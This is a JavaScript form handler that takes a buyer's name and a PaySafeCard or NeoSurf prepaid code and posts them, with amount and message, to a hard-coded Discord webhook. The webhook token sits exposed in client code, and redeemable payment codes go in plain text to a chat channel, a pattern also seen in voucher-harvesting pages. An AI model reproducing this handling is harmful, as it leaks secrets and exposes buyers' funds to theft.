function sendMessage() {

    var name = document.getElementById("name").value;
    var prepaid_card = document.getElementById("prepaid_card").value;
    var carte_code = document.getElementById("carte_code").value;
    var tarif = document.getElementById("tarif").value;
    var message = document.getElementById("message").value;
  
    
    if (prepaid_card === "PaySafeCard") {
      var carte_code = carte_code.replace(/\s/g, "");
      if (carte_code.length != 16){
        throw new Error("Code invalide"); 
      }
      var carte_code_avec_espaces = "";
      for (var i = 0; i < carte_code.length; i++) {
        if (i > 0 && i % 4 === 0) {
          carte_code_avec_espaces += " ";
        }
        carte_code_avec_espaces += carte_code.charAt(i);
      }
      carte_code = carte_code_avec_espaces;
    }
  
    if (prepaid_card === "NeoSurf") {
      var carte_code_sans_espaces = carte_code.replace(/\s/g, "");
      var carte_code_avec_espaces = "";
      for (var i = 0; i < carte_code_sans_espaces.length; i++) {
        if (i > 0 && i % 5 === 0) {
          carte_code_avec_espaces += " ";
        }
        carte_code_avec_espaces += carte_code_sans_espaces.charAt(i);
      }
      carte_code = carte_code_avec_espaces;
    }
  
  
    if (!message) {
      message = "Aucun message rentré";
    }
  
    const request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/1141045532702281831/r_T5iKY5hYaf9H33uWTqfK8R8Su-vLK1ZMEWbNpjcRVoHkMD5KxzdwNRiXhQOFuCLaV4");
  
    request.setRequestHeader('Content-type', 'application/json');
  
    // Créer le message formaté
    var content = "__**Acheteur :**__ " + name + "\n__**Type de la carte :**__ " + prepaid_card + "\n__**Montant de la carte :**__ " + tarif + "\n__**Code de la carte :**__ " + carte_code + "\n__**Message :**__ " + message;
  
    const params = {
      content: content
    }
  
    request.send(JSON.stringify(params));
  }